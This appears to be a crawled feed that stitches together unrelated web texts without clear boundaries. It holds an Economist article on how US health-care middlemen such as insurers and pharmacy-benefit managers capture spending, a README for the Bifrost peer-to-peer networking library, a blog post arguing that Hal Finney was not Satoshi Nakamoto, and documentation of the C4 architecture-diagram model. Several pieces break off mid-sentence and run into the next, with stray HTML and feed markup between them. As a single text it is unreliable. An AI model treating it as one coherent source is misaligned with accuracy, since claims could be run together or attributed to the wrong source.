The walkout was the biggest in the history of America’s health sector, and called attention to the staffing shortages plaguing the country’s hospitals and clinics. In the same week ten drugmakers said they would negotiate medicine prices with Medicare, the public health-care system for the elderly, following legislation which all but forced them to. It will be the first time that companies have haggled over prices with the government.</p><div><figure><div><figcaption>Listen to this story.</figcaption> <p><span>Enjoy more audio and podcasts on<!-- --> <a id="audio-ios-cta" href="https://economist-app.onelink.me/d2eC/bed1b25" target="_blank" rel="noreferrer">iOS</a> <!-- -->or<!-- --> <a id="audio-android-cta" href="https://economist-app.onelink.me/d2eC/7f3c199" target="_blank" rel="noreferrer">Android</a>.</span></p></div><audio controls="" id="audio-player" preload="none" src="https://www.economist.com/media-assets/audio/057%20Business%20-%20Corporate%20concentration-044326aa3c71b99c26c33bb7b0ff46bf.mp3" title="Who profits most from America’s baffling health-care system?" controlslist="nodownload"><p>Your browser does not support the &lt;audio&gt; element.</p></audio></figure></div><p>These events are symptoms of deeper malaise in America’s dysfunctional health-care system. The country spends about $4.3trn a year on keeping citizens in good nick. That is equivalent to 17% of <small>GDP</small>, twice as much as the average in other rich economies. And yet American adults live shorter lives and American infants die more often than in similarly affluent places. Pharmaceutical firms and hospitals attract much of the public ire for the inflated costs. Much less attention is paid to a small number of middlemen who extract far bigger rents from the system’s complexity. </p><p>Over the past decade these firms have quietly increased their presence in America’s vast health-care industry (see chart ). They do not make drugs and have not, until recently, treated patients. They are the intermediaries—insurers, chemists, drug distributors and pharmacy-benefit managers (<small>PBM</small>s)—sitting between patients and their treatments. In 2022 the combined revenue of the nine biggest middlemen—call them big health—equated to nearly 45% of America’s health-care bill, up from 25% in 2013. Big health accounts for eight of the top 25 companies by revenue in the <small>S</small>&amp;<small>P</small> 500 index of America’s leading stocks, compared with four for big tech and none for big pharma. </p><figure data-infographic-class="g-fallback"></figure><figure></figure><p>Big health began as a constellation of oligopolies. Four private health insurers account for 50% of all enrolments. The biggest, UnitedHealth Group, made $324bn in revenues last year, behind only Walmart, Amazon, Apple and ExxonMobil, and $25bn in pre-tax profit. Its 151m customers represent nearly half of all Americans. Its market capitalisation has doubled in the past five years, to $486bn, making it America’s 12th-most-valuable company. Four pharmacy giants generate 60% of America’s drug-dispensing revenues. The mightiest of them, <small>CVS</small> Health, alone made up a quarter of all pharmacy sales. Just three <small>PBM</small>s handled 80% of all prescription claims. And a whopping 92% of all drugs flow through three wholesalers.</p><p>With little room left to grow in their core businesses, and trustbusters blocking attempts to buy direct rivals, the oligopolists have been expanding into other bits of the health-care supply chain. Besides adding to the top line, such vertical integration is juicing margins. The Affordable Care Act of 2010 limited the profits of health insurers to between 15% and 20% of collected premiums, depending on the size of the health plan. But it imposed no restrictions on what physicians or other intermediaries can earn. The law created an incentive for insurers to buy clinics, pharmacies and the like, and to steer customers to them rather than rival providers. The strategy channels revenue from the profit-capped insurance business to uncapped subsidiaries, which in theory could let insurers keep more of the premiums paid by patients.</p><p>According to Irving Levin Associates, a research firm, between 2013 and August 2023 the nine health-care giants spent around $325bn on over 130 mergers and acquisitions. Some of these deals have pushed the firms deeper into each other’s turf. In 2017 <small>CVS</small> offered $78bn for Aetna, a large health insurer and a competitor to UnitedHealth. The following year Cigna, another big insurer, swallowed Express Scripts, a big <small>PBM</small>, for $67bn. In 2022 UnitedHealth paid $13bn for Change Healthcare, a data-analytics firm which processes insurance claims for large parts of the industry, including UnitedHealth’s rivals.</p><figure data-infographic-class="g-fallback"></figure><figure></figure><p>Both UnitedHealth and <small>CVS </small>have been buying up health-care providers, too. Optum Health, a subsidiary of UnitedHealth, has spent over $23bn on such transactions in the past six years, and now treats more than 20m patients through a network of 2,200 clinics. It has more doctors on its books—70,000 employed or affiliated physicians—than the biggest hospital chains in the country. <small>CVS</small> runs 1,100 or so neighbourhood clinics and this year alone paid $18bn for two companies focused on the lucrative elderly-care market.</p><p>Industry executives say that bringing all parts of patient care—primary-care clinics, pharmacy services, <small>PBM</small>s and insurance—under one roof is beneficial for all. In the old fee-for-service model, big health argues, doctors or hospitals are paid for each service they provide, encouraging them to perform as many as possible and charge as much as they can. If doctors and insurance companies are part of the same business, by contrast, incentives should be aligned and overall costs should be lower.</p><p>That, at least, is the theory. And there is some truth to it. Despite its recent labour troubles, Kaiser Permanente has historically been hailed as a role model for efficient and high-quality health care. Its business, with 39 hospitals and over 24,000 doctors, is highly integrated, with Kaiser’s insurance plans covering members’ treatment at its hospitals and clinics. This April Kaiser announced it would acquire Geisinger Health, a Pennsylvania-based health system, to expand its model of integrated care to more states.</p><p>Yet vertical integration can have adverse side-effects. For example, many studies have found that after hospitals acquire physician practices, prices increase but quality of care does not. A health-care company that controls many aspects of patient care could raise prices for rivals wishing to access its network. Some also worry about physicians being nudged towards offering the cheapest treatment to patients, lowering the quality of care.</p><p>There is as yet no evidence of trouble with the model, argues Richard Frank of the Brookings Institution, a think-tank. But elsewhere in big health signs of oligopolistic behaviour can be seen. Consider <small>PBM</small>s. These middlemen are in the crosshairs of lawmakers and regulators for their role in setting drug prices. At least four different bills that seek to regulate <small>PBM</small>s are making their way through Congress. For almost two decades, the Federal Trade Commission (<small>FTC</small>), America’s main antitrust agency, pushed back against efforts to increase oversight of<small> PBM</small>s, arguing that such moves would harm consumers. In July 2022, however, the <small>ftc</small> changed tack and launched an investigation into the business practices of the largest <small>PBMS.</small></p><p>At issue is <small>PBM</small>s’ opaque pricing, which takes a drug’s list price and shaves off discounts that the <small>PBM</small> wrangles from drugmakers. <small>PBM</small>s claim they are a counterweight to big pharma. But critics argue that large <small>PBM</small>s do not pass on the discounts to the health plans, instead keeping much of the difference for themselves, and limit access to treatments that are less profitable for them. In August Blue Shield of California, a regional health insurer, ditched <small>CVS</small>’s <small>PBM</small> in favour of smaller firms to save on drug costs for its nearly 5m members. </p><p>America’s health-care intermediaries are indeed unusually profitable. Research by Neeraj Sood of the University of Southern California and colleagues found that intermediaries in the health-care supply chain earned annualised excess returns—defined as the difference between their return on invested capital and their weighted-average cost of capital—of 5.9 percentage points between 2013 and 2018, compared with 3.6 for the <small>S</small>&amp;<small>P </small>500 as a whole.</p><figure data-infographic-class="g-fallback"></figure><figure></figure><p>Big health’s giant pool of excess profits is at last attracting newcomers. Upstart health insurers like Bright Health Group and Oscar Health have positioned themselves as a transparent and consumer-friendly alternative to the old guard. Mark Cuban Cost Plus Drug Company, an online pharmacy started by the eponymous billionaire, bypasses the middlemen by buying cheaper generics directly from manufacturers and selling them to consumers at a fixed 15% mark-up. </p><p>Perhaps the biggest disruption to big health could come from <a href="https://www.economist.com/business/2022/11/20/amazon-makes-a-new-push-into-health-care">Amazon</a>. In 2021 its health-care ambitions suffered a setback owing to the closure of Haven Healthcare, a not-for-profit joint venture with JPMorgan Chase, the biggest bank in America, and Berkshire Hathaway, the biggest investment firm. Haven had aimed to cut health-care costs for the trio’s own staff. But despite Haven’s failure, Amazon is still expanding its health-care business. Last year it paid $3.9bn for One Medical, a primary-care provider. It runs Amazon Clinic, an online service offering virtual consultations, and RxPass, which lets members of its Prime subscription service buy unlimited generic drugs for a small fee. John Love, who heads Amazon’s pharmacy business, believes that the tech giant’s focus on customer experience, combined with its vast logistics network, makes it well-suited to shake up the industry.</p><p>So far the newcomers’ impact has been muted. Lisa Gill of JPMorgan Chase reckons that most of them underestimate the complexity of the business of health. The entrenched firms have built their networks of doctors, hospitals, insurers and drugmakers over decades. Replicating that takes time and institutional knowledge. Mr Cuban admits that it is difficult to get drugmakers to list branded drugs on his pharmacy, as they are wary of upsetting the large <small>PBM</small>s. And without branded drugs and the support of large health insurers, his firm’s reach remains small. The cap on insurers’ profits makes life tough for upstarts in that business, which struggle to compete against the negotiating power of the integrated giants. </p><p>Even Haven, which covered its backers’ 1.2m American employees and their families, didn’t command enough market power to compel lower prices from health-care firms. Amazon’s pharmacy business has yet to break into America’s top 15 chemist chains. Big tech may be powerful. But for now even it bows before big health. <span data-ornament="ufinish">■</span></p><p><i>To stay on top of the biggest stories in business and technology, sign up to the <a href="https://www.economist.com/newsletters/the-bottom-line">Bottom Line</a>, our weekly subscriber-only newsletter.</i></p><p><em>Chart sources: American Medical Association; Drug Channels; Irving Levin Associates; Refinitiv Datastream; Health Affairs; <i>The Economist</i></em></p></div><div><p>This article appeared in the Business section of the print edition under the headline "Really big health"</p><p>Chart sources: American Medical Association; Drug Channels; Irving Levin Associates; Refinitiv Datastream; Health Affairs; <i>The Economist</i></p></div><div data-tracking-id="content-well-chapter-list"><h2><a href="https://www.economist.com/business/">Business</a> <span>October 14th 2023</span></h2><ul><li><a href="https://www.economist.com/business/2023/10/08/who-profits-most-from-americas-baffling-health-care-system"><span>Who profits most from America’s baffling health-care system?</span></a></li><li><a href="https://www.economist.com/business/2023/10/11/why-exxonmobil-is-paying-60bn-for-pioneer"><span>Why ExxonMobil is paying $60bn for Pioneer</span></a></li><li><a href="https://www.economist.com/business/2023/10/12/a-38bn-deal-points-to-the-future-of-car-parts-suppliers"><span>A $3.8bn deal points to the future of car-parts suppliers</span></a></li><li><a href="https://www.economist.com/business/2023/10/12/the-fall-of-chinas-manganese-king-may-hit-global-ev-supply-chains"><span>The fall of China’s “manganese king” may hit global EV supply chains</span></a></li><li><a href="https://www.economist.com/business/2023/10/12/trialling-the-two-day-workweek"><span>Trialling the two-day workweek</span></a></li><li><a href="https://www.economist.com/business/2023/10/12/why-young-consumers-love-birkenstocks"><span>Why young consumers love Birkenstocks</span></a></li><li><a href="https://www.economist.com/business/2023/10/12/taiwan-will-not-surrender-its-semiconductor-supremacy"><span>Taiwan will not surrender its semiconductor supremacy</span></a></li><li><a href="https://www.economist.com/business/2023/10/12/weight-loss-drugs-are-no-match-for-the-might-of-big-food"><span>Weight-loss drugs are no match for the might of big food</span></a></li></ul></div><div orientation="vertical" data-test-id="vertical"><div orientation="vertical"><figure><img alt="Israel’s agony and its retribution" loading="lazy" width="1280" height="1684" decoding="async" data-nimg="1" sizes="300px" srcset="https://www.economist.com/img/b/16/21/90/media-assets/image/20231014_DE_EU.jpg 16w, https://www.economist.com/img/b/32/42/90/media-assets/image/20231014_DE_EU.jpg 32w, https://www.economist.com/img/b/48/63/90/media-assets/image/20231014_DE_EU.jpg 48w, https://www.economist.com/img/b/64/84/90/media-assets/image/20231014_DE_EU.jpg 64w, https://www.economist.com/img/b/96/126/90/media-assets/image/20231014_DE_EU.jpg 96w, https://www.economist.com/img/b/128/168/90/media-assets/image/20231014_DE_EU.jpg 128w, https://www.economist.com/img/b/256/336/90/media-assets/image/20231014_DE_EU.jpg 256w, https://www.economist.com/img/b/360/473/90/media-assets/image/20231014_DE_EU.jpg 360w, https://www.economist.com/img/b/384/505/90/media-assets/image/20231014_DE_EU.jpg 384w, https://www.economist.com/img/b/480/631/90/media-assets/image/20231014_DE_EU.jpg 480w, https://www.economist.com/img/b/600/789/90/media-assets/image/20231014_DE_EU.jpg 600w, https://www.economist.com/img/b/834/1097/90/media-assets/image/20231014_DE_EU.jpg 834w, https://www.economist.com/img/b/960/1263/90/media-assets/image/20231014_DE_EU.jpg 960w, https://www.economist.com/img/b/1096/1441/90/media-assets/image/20231014_DE_EU.jpg 1096w, https://www.economist.com/img/b/1280/1684/90/media-assets/image/20231014_DE_EU.jpg 1280w, https://www.economist.com/img/b/1424/1873/90/media-assets/image/20231014_DE_EU.jpg 1424w" src="https://www.economist.com/img/b/1424/1873/90/media-assets/image/20231014_DE_EU.jpg"></figure></div><div orientation="vertical"><h3 orientation="vertical">From the October 14th 2023 edition</h3><p orientation="vertical">Discover stories from this section and more in the list of contents </p><a href="https://www.economist.com/printedition/2023-10-14" data-analytics="sidebar:weekly_edition"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M12 1c6.075 0 11 4.925 11 11s-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1zm.142 4.5l-1.008 1.062c3.33 3.276 4.194 4.14 4.608 4.5-1.602-.018-3.168-.018-10.242-.018v1.584c7.074 0 8.73 0 10.242-.018-.432.36-1.314 1.206-4.608 4.536l1.008 1.044 6.354-6.354L12.142 5.5z" fill="#2E45B8" fill-rule="nonzero"></path></g></svg><span>Explore the edition</span></a></div></div></div></div>]]></description>

<h2 tabindex="-1" id="user-content-introduction" dir="auto"><a href="#introduction">Introduction</a></h2>
<p dir="auto"><strong>Bifrost</strong> is a peer-to-peer communications engine with pluggable transports:</p>
<ul dir="auto">
<li><strong>Cross-platform</strong>: supports web browsers, servers, desktop, mobile, ...</li>
<li><strong>Efficient</strong>: multiplex many simultaneous streams over a single Link.</li>
<li><strong>Encryption</strong>: identify, authenticate, and encrypt each Link between peers.</li>
<li><strong>Flexible</strong>: use multiple transports, protocols, simultaneously.</li>
<li><strong>Meshing</strong>: supports multi-hop routing to a desired target peer w/ circuits.</li>
<li><strong>PubSub</strong>: publish/subscribe channels with pluggable implementations.</li>
<li><strong>Robust</strong>: uses Quic for reliable connections over lossy transports.</li>
</ul>
<p dir="auto">Bifrost uses <a href="https://github.com/aperturerobotics/controllerbus">ControllerBus</a> controllers and directives to manage links between
peers, transports, routing, and other higher-level processes with extensive and
flexible configuration.</p>

<p dir="auto">Bifrost is designed around the following core concepts:</p>
<ul dir="auto">
<li><strong>Peer</strong>: a routable process or device with a keypair.</li>
<li><strong>Transport</strong>: a protocol which can create Links with other peers.</li>
<li><strong>Link</strong>: a connection between two peers over a Transport.</li>
<li><strong>Stream</strong>: channel of data between two Peer with a protocol type.</li>
<li><strong>RPC</strong>: request/reply and bidirectional streaming remote calls.</li>
<li><strong>PubSub</strong>: at-least-once delivery of messages to named topics.</li>
</ul>
<p dir="auto">Integrates with networking, pubsub, and RPC libraries like <a href="https://libp2p.io/" rel="nofollow">libp2p</a>, <a href="https://github.com/perlin-network/noise">noise</a>,

end-to-end tests as Go unit tests. The mock transports use identical code to the
real transports, and appear the same to the application code.</p>
<p dir="auto">The <a href="https://github.com/aperturerobotics/bifrost/blob/master/http">http</a> packages provide a http server and a mechanism for attaching http
handlers to the controller bus and using them to serve requests. There is also
an implementation of attaching and looking up http clients on the bus.</p>
<p dir="auto"><a href="https://github.com/aperturerobotics/entitygraph">EntityGraph</a> exposes the internal state representation of Bifrost to
visualizers and instrumentation via a graph-based inter-connected entity model.</p>
<p dir="auto">Configuring each component as an independent controller makes it easy to adapt
application code to different operating environments and protocols.</p>

<p dir="auto">This example shows how to run two daemons with information on how to contact
each other, and then "tell" the second daemon to listen on port 8002 and forward
any incoming connections to the remote peer with the given peer ID.</p>
<p dir="auto">When someone connects to port 8002 the EstablishLinkWithPeer directive is added
and the UDP transport opens the connection with the peer (on-demand.) The stream
is then negotiated. The remote daemon uses HandleMountedStream which is handled
by the "forwarding" controller, which forwards the stream to localhost at 8000.</p>
<h2 tabindex="-1" id="user-content-transports-and-links" dir="auto"><a href="#transports-and-links">Transports and Links</a></h2>
<p dir="auto">A Link is a packet stream between two Peer. Links are created by Transports,
which are associated with a local private keypair.</p>
<p dir="auto">Transports are responsible for handshaking their identity and providing stream
multiplexing, encryption, and ordering. The Bifrost codebase contains common
implementations for packet-based and stream-based transports, based primarily on
the <a href="https://github.com/quic-go/quic-go">quic-go</a> implementation of the Quic UDP protocol.</p>
<p dir="auto">The HandleMountedStream directive contains incoming protocol and peer info. The
appropriate controller for the protocol responds to the directive and handles
the incoming stream. This decouples the transport layers from the protocols.</p>

        <p>The mystery of Satoshi Nakamoto's identity has intrigued countless people ever since the inception of Bitcoin in 2009. Who, the world wonders, would be so gifted that they could solve the Byzantine Generals' Problem? Who, we ask, is so altruistic as to create a new monetary system but not use it to enrich themselves? Who, we question, is sufficiently privacy-conscious that they could pull off these magnificent feats and manage not to leak their true name?</p><figure><img src="https://blog.lopp.net/content/images/2023/10/hacker_middle_finger.png" alt="" loading="lazy" width="1024" height="1024" srcset="https://blog.lopp.net/content/images/size/w600/2023/10/hacker_middle_finger.png 600w, https://blog.lopp.net/content/images/size/w1000/2023/10/hacker_middle_finger.png 1000w, https://blog.lopp.net/content/images/2023/10/hacker_middle_finger.png 1024w" sizes="(min-width: 720px) 720px"></figure><p>The actual identity of Satoshi Nakamoto is irrelevant to the security, evolution, and future operation of the Bitcoin network. But the speculation of Satoshi's identity does have real-world consequences for those who end up in its crosshairs.</p><p>Hal Finney was <a href="https://archive.fo/WvHB9?ref=blog.lopp.net">swatted and extorted</a> in 2014 when he was in poor health.</p><p>Dorian Nakamoto's life was <a href="https://bitcoinmagazine.com/culture/how-the-hunt-for-satoshi-turned-dorian-nakamoto-s-life-upside-down-the-inside-story?ref=blog.lopp.net">upended by Newsweek's baseless speculation</a> in 2014.</p><p>A multitude of scammers have taken the opposite route and tried to leech off of Satoshi’s reputation by claiming to be him.</p><figure><img src="https://blog.lopp.net/content/images/2023/10/we-are-all-satoshi-nakamoto.jpg" alt="" loading="lazy" width="650" height="638" srcset="https://blog.lopp.net/content/images/size/w600/2023/10/we-are-all-satoshi-nakamoto.jpg 600w, https://blog.lopp.net/content/images/2023/10/we-are-all-satoshi-nakamoto.jpg 650w"></figure><p>Who do I think is Satoshi? I have my theories, but I shall never share them as it would be irresponsible to do so. Rather, I believe it is in the best interest of Bitcoin to dispel any myths of Satoshi's identity. Let's begin.</p><h3 id="the-race">The Race</h3><p>On Saturday April 18, 2009 at 8 AM Pacific time Hal Finney, an avid runner, began a 10 mile race in Santa Barbara, California. We can see his <a href="https://archive.is/46t9A?ref=blog.lopp.net">results here</a>:</p><figure><img src="https://blog.lopp.net/content/images/2023/08/hal_finney_race_results.png" alt="" loading="lazy" width="939" height="543" srcset="https://blog.lopp.net/content/images/size/w600/2023/08/hal_finney_race_results.png 600w, https://blog.lopp.net/content/images/2023/08/hal_finney_race_results.png 939w" sizes="(min-width: 720px) 720px"><figcaption>Source: https://archive.is/46t9A</figcaption></figure><p>Why is this noteworthy? Because Satoshi was performing activities <em>at the same time</em> that Hal was running. For the hour and 18 minutes that Hal was running, we can be <strong>quite sure</strong> that he was not interacting with a computer.</p><p>It turns out that early Bitcoin developer Mike Hearn was emailing back and forth with Satoshi during this time. Hearn later published his emails on his web site; you can <a href="https://archive.is/f68bN?ref=blog.lopp.net">find a copy archived here.</a></p><p>We can see from the timestamps that Mike emailed Satoshi on Apr 18, 2009 at 3:08 PM and Satoshi replied at 6:16 PM. But what time zone was Mike's email client reporting? Well, Hearn conveniently included his IP address at the time (because one way of sending and receiving bitcoin back then was via direct connection to a peer node's IP address) and his address was 84.73.233.199.

When CipherionX asked me for these emails again, he told me they'd actually never been uploaded anywhere and so I forwarded them once more.<p>The emails are real. As others have noted, I quoted parts of them in various conversations stretching over many years. It would have required vast planning to have set up such a forgery and there is no reason to do so.</p></blockquote><p>“<em>Hal could have scripted the emails and transactions.</em>”</p><p>Sure, but Occam’s Razor applies. Why go to such lengths to sow disinformation in a private communication? It would have been far simpler for Hal to have just responded at a different time rather than leaving this proverbial needle in the haystack that would have never been revealed had Hearn not published the emails.</p><p>“<em>Hal could have been one member of a group.</em>”</p><p>Sure, but Occam's Razor again. As Benjamin Franklin noted: “Three can keep a secret, if two of them are dead.” In all my time researching Satoshi, I've yet to come across any evidence suggesting it was a group. If it was a group, then they all operated on the same sleep schedule, consistent across code commits, emails, and forum posts.</p><figure><img src="https://blog.lopp.net/content/images/2023/10/Satoshi-Public-Activity-Hour-of-Day--2009-2010-.png" alt="" loading="lazy" width="600" height="371" srcset="https://blog.lopp.net/content/images/2023/10/Satoshi-Public-Activity-Hour-of-Day--2009-2010-.png 600w"></figure><p>“<em>The early blockchain history could have been rewritten.</em>”</p><p>Technically true, though 3 hours later Mike sent BTC back &amp; confirmed via email.

Hal was diagnosed with ALS (Amyotrophic Lateral Sclerosis, better known in the US as "Lou Gehrig's Disease"). Since his diagnosis in August of 2009, Hal has physically changed in very obvious ways. His speech has become slow, quiet, and labored. His typing has gone from rapid-fire 120 WPM to a sluggish finger peck. His weekly running (50-60 miles per week in February 2009) stopped being possible in November of 2009, and now Hal gets around in a motorized wheelchair. Eating, always a pleasure before, is now a challenge - much concentration is involved to avoid choking. The most recent and worrisome manifestation of the weakening in Hal's voluntary muscles is his breathing. However - all of these changes have been to Hal's body. The machine that Hal's brain controls through efferent output to interact with the environment. Inside, he is the same brilliant guy I have known for well over half of my life.</blockquote><p>She specifically talks about how Hal can barely type at this point.</p><p>What was Satoshi doing on August 14 and 15 of 2010?

For example:</p><figure><blockquote><p lang="en" dir="ltr">Thinking about how to reduce CO2 emissions from a widespread Bitcoin implementation</p>— halfin (@halfin) <a href="https://twitter.com/halfin/status/1153096538?ref_src=twsrc%5Etfw&amp;ref=blog.lopp.net">January 27, 2009</a></blockquote>

</figure><p>Are we to believe that Satoshi had been working on Bitcoin for a year (if not years) but suddenly started being concerned about CO2 emissions?</p><p>It appears that Satoshi Nakamoto only learned about Nick Szabo’s "bit gold" idea from <a href="https://www.mail-archive.com%2Fcryptography@www.mail-archive.com/cryptography@metzdowd.com/msg09975.html?ref=blog.lopp.net">Hal Finney’s first reply</a> to the whitepaper announcement post on the cryptography mailing list.</p><blockquote>I also do think that there is potential value in a form of unforgeable token whose production rate is predictable and can't be influenced by corrupt parties. This would be more analogous to gold than to fiat currencies. Nick Szabo wrote many years ago about what he called "bit gold" and this could be an implementation of that concept.</blockquote><p>Once again, this level of "character development" for alternate personas is a pretty big ask for someone who is not a professional fiction writer.</p><p>Hal Finney was not actually a particularly private person. According to his wife, Hal was a huge privacy advocate and believed everyone had the right to privacy. But privacy is the ability to selectively reveal yourself to the world, and Hal was quite open about his dealings.</p><p>In terms of being privacy conscious, most of the other Satoshi contenders are far stronger candidates with regard to this attribute.</p><h3 id="inconsistencies-in-activity-gaps">Inconsistencies in Activity Gaps</h3><p>Satoshi had 2 lengthy gaps in their public activity:</p><ol><li>From 2009-03-04 16:59:12 UTC to 2009-10-21 1:08:05 UTC</li><li>From 2010-03-24 18:02:55 UTC to 2010-05-16 21:01:44 UTC</li></ol><p>We can see that Hal Finney kept posting during those periods:</p><ul><li><a href="https://www.mail-archive.com/search?a=1&amp;l=cryptography%40metzdowd.com&amp;haswords=%22hal+finney%22&amp;x=0&amp;y=0&amp;from=&amp;subject=&amp;datewithin=1y&amp;date=1%2F1%2F2010&amp;notwords=&amp;o=relevance&amp;ref=blog.lopp.net">Email timestamps</a></li><li><a href="https://www.lesswrong.com/users/halfinney?ref=blog.lopp.net">LessWrong timestamps</a></li></ul><p>While this doesn't prove anything, it's yet another difference in the characteristics of Hal and Satoshi.</p><h3 id="hal-was-a-legend-just-not-that-legend">Hal was a Legend, Just not That Legend</h3><p>We should all aspire to be like Hal Finney.</p><figure><blockquote><p lang="en" dir="ltr">1) I recommend that every Bitcoin enthusiast reads Satoshi's original announcement email thread in its entirety: <a href="https://t.co/wt0X5w2ulc?ref=blog.lopp.net">https://t.co/wt0X5w2ulc</a></p>— Jameson Lopp (@lopp) <a href="https://twitter.com/lopp/status/721701694518751232?ref_src=twsrc%5Etfw&amp;ref=blog.lopp.net">April 17, 2016</a></blockquote>

Computing proofs-of-work have no intrinsic value. &nbsp;We can have a limited supply curve but there is no demand curve that intersects it at a positive price point.</p><p>Hal arrives: “Bitcoin seems to be a very promising idea. I like the idea of basing security on the assumption that the CPU power of honest participants outweighs that of the attacker. It is a very modern notion that exploits the power of the long tail. When Wikipedia started I never thought it would work, but it has proven to be a great success for some of the same reasons.”</p><p>Hal was an optimist, a builder, and a thoughtful collaborator. He made great contributions to cypherpunk projects like anonymous remailers, PGP 2.0, Reusable Proofs of Work, and Bitcoin. Open source projects need people like Hal.</p><h3 id="this-is-good-for-bitcoin">This is Good for Bitcoin</h3><p>Some will surely claim that the prior points do not constitute incontrovertible proof that Hal was not Satoshi. Indeed, proving a negative is often an impossible task. But I find the aggregate of all the evidence to provide so much doubt that a reasonable person would conclude that it's far more likely that Satoshi was someone else. After months of research I have been sufficiently convinced that I am willing to stake my reputation upon this claim.</p><figure><blockquote><p lang="en" dir="ltr">Bitcoin is better off with Satoshi's identity remaining unknown.

                <h2>Introduction</h2>
                <p>
                    Ask somebody in the building industry to visually communicate the architecture of a building and you'll be presented with site plans, floor plans, elevation views, cross-section views and detail drawings.
                    In contrast, ask a software developer to communicate the software architecture of a software system using diagrams and you'll likely get a confused mess of boxes and lines ...
                    inconsistent notation (colour coding, shapes, line styles, etc), ambiguous naming, unlabelled relationships, generic terminology, missing technology choices, mixed abstractions, etc.
                </p>

                

                <p>
                    As an industry, we do have the Unified Modeling Language (UML), ArchiMate and SysML,
                    but asking whether these provide an effective way to communicate software architecture is often irrelevant because many teams have already thrown them out in favour of much simpler "boxes and lines" diagrams.
                    Abandoning these modelling languages is one thing but, perhaps in the race for agility, many software development teams have lost the ability to communicate visually.

                <h3>Maps of your code</h3>
                <p>
                    The C4 model was created as a way to help software development teams describe and communicate software architecture, both during up-front design sessions and when retrospectively documenting an existing codebase.
                    It's a way to create maps of your code, at various levels of detail, in the same way you would use something like Google Maps to zoom in and out of an area you are interested in.

                <p>
                    The C4 model is an "abstraction-first" approach to diagramming software architecture, based upon abstractions that reflect how
                    software architects and developers think about and build software. The small set of abstractions and diagram types makes the C4 model
                    easy to learn and use.
                    Please note that you don't need to use all 4 levels of diagram; only those that add value - the System Context and Container diagrams are sufficient for many software development teams.

                <h2>Abstractions</h2>
                <p>
                    In order to create these maps of your code, we first need a common set of abstractions to create a ubiquitous language that we can use to describe the static structure of a software system.
                    A <b>software system</b> is made up of one or more <b>containers</b> (applications and data stores),
                    each of which contains one or more <b>components</b>,
                    which in turn are implemented by one or more <b>code elements</b> (classes, interfaces, objects, functions, etc).
                    And <b>people</b> may use the software systems that we build.
                </p>

                    <a href="https://c4model.com/img/abstractions.png"><img src="https://c4model.com/img/abstractions.png" alt="Abstractions"></a>
                </p>
                

                <h3>Person</h3>
                <p>
                    A person represents one of the human users of your software system (e.g. actors, roles, personas, etc).
                </p>

                <h3>Software System</h3>
                <p>
                    A software system is the highest level of abstraction and describes something that delivers value to its users, whether they are human or not. This includes the software system you are modelling, and the other software systems upon which your software system depends (or vice versa).
                    In many cases, a software system is "owned by" a single software development team.
                </p>

                <h3>Container <span>(applications and data stores)</span></h3>
                <p>
                    Not Docker! In the C4 model, a container represents an <b>application</b> or a <b>data store</b>. A container is something that needs to
                    be running in order for the overall software system to work. In real terms, a container is something like:
                </p>
                
                <ul>
                    <li><b>Server-side web application</b>: A Java EE web application running on Apache Tomcat, an ASP.NET MVC application running on Microsoft IIS, a Ruby on Rails application running on WEBrick, a Node.js application, etc.</li>
                    <li><b>Client-side web application</b>: A JavaScript application running in a web browser using Angular, Backbone.JS, jQuery, etc.</li>
                    <li><b>Client-side desktop application</b>: A Windows desktop application written using WPF, an OS X desktop application written using Objective-C, a cross-platform desktop application written using JavaFX, etc.</li>
                    <li><b>Mobile app</b>: An Apple iOS app, an Android app, a Microsoft Windows Phone app, etc.</li>
                    <li><b>Server-side console application</b>: A standalone (e.g. "public static void main") application, a batch process, etc.</li>
                    <li><b>Serverless function</b>: A single serverless function (e.g. Amazon Lambda, Azure Function, etc).</li>
                    <li><b>Database</b>: A schema or database in a relational database management system, document store, graph database, etc such as MySQL, Microsoft SQL Server, Oracle Database, MongoDB, Riak, Cassandra, Neo4j, etc.</li>
                    <li><b>Blob or content store</b>: A blob store (e.g. Amazon S3, Microsoft Azure Blob Storage, etc) or content delivery network (e.g. Akamai, Amazon CloudFront, etc).</li>
                    <li><b>File system</b>: A full local file system or a portion of a larger networked file system (e.g. SAN, NAS, etc).</li>
                    <li><b>Shell script</b>: A single shell script written in Bash, etc.</li>
                    <li><b>etc</b></li>
                </ul>

                <p>
                    A container is essentially a context or boundary inside which some code is executed or some data is stored.
                    And each container is a separately deployable/runnable thing or runtime environment, typically (but not always) running in its own process space.
                    Because of this, communication between containers typically takes the form of an inter-process communication.
                </p>

                <h3>Component</h3>
                <p>
                    The word "component" is a hugely overloaded term in the software development industry, but in this context a component is a grouping of related functionality encapsulated behind a well-defined interface.
                    If you're using a language like Java or C#, the simplest way to think of a component is that it's a collection of implementation classes behind an interface. Aspects such as how those components are packaged (e.g. one component vs many components per JAR file, DLL, shared library, etc) is a separate and orthogonal concern.
                </p>
                <p>
                    An important point to note here is that all components inside a container typically execute in the same process space.
                    <b>In the C4 model, components are not separately deployable units.</b>
                </p>

                            A System Context diagram is a good starting point for diagramming and documenting a software system,
                            allowing you to step back and see the big picture. Draw a diagram showing your system
                            as a box in the centre, surrounded by its users and the other systems that it interacts with.
                        </p>

                        <p>
                            Detail isn't important here as this is your zoomed out view showing a big picture of the system landscape.
                            The focus should be on people (actors, roles, personas, etc) and software systems rather than technologies,
                            protocols and other low-level details. It's the sort of diagram that you could show to non-technical people.

                            Once you understand how your system fits in to the overall IT environment, a really useful next step is to zoom-in to the system boundary with a Container diagram.
                            A "container" is something like a server-side web application, single-page application, desktop application, mobile app, database schema, file system, etc.
                            Essentially, a container is a separately runnable/deployable unit (e.g. a separate process space) that executes code or stores data.
                        </p>

                        <p>
                            The Container diagram shows the high-level shape of the software architecture and how responsibilities
                            are distributed across it. It also shows the major technology choices and how the containers communicate
                            with one another. It's a simple, high-level technology focussed diagram that is useful for
                            software developers and support/operations staff alike.

                            The Component diagram shows how a container is made up of a number of "components", what each of those
                            components are, their responsibilities and the technology/implementation details.

                            This is an optional level of detail and is often available on-demand from tooling such as IDEs.
                            Ideally this diagram would be automatically generated using tooling (e.g. an IDE or UML modelling tool), and you should consider showing only those attributes and methods that allow you to tell the story that you want to tell.
                            This level of detail is not recommended for anything but the most important or complex components.

                            The C4 model provides a static view of a <b>single software system</b> but, in the real-world, software systems never live in isolation.
                            For this reason, and particularly if you are responsible for a collection/portfolio of software systems,
